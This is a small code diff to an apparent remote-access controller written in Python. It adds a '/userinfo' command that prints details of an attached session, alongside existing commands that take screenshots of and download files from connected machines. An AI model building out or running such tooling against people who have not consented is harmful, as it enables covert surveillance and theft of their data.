@@ -25,6 +25,18 @@ class Server(object):
 
     def __repr__(self):
         print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')
+    
+    # getting the current user who you are attached
+    def getCurrentUser(self):
+        return self.connectedUsers[self.userAttached]
+
+    # basic information from attached user
+    def userInfo(self, args=''):
+        if self.userAttached:
+            user = self.getCurrentUser()
+            printr(''.join(f'{key}: {value}\n' for key, value in user.items() if key not in ['conn', 'currentDirectory', 'initialTime']))
+        else:
+            printr(f'[red] No session currently attached.')
 
     # attaches to an active session
     def attach(self, name):
@@ -206,6 +218,7 @@ class Server(object):
             "/attach": {"local": True, "action": self.attach},
             "/detach": {"local": True, "action": self.detach},
             "/sessions": {"local": True, "action": self.showSessions},
+            "/userinfo": {"local": True, "action": self.userInfo},
             "/rmsession": {"local": True, "action": self.removeUser},
             "/screenshot": {"local": False, "action": self.screenshot},
             "/download": {"local": False, "action": self.download},
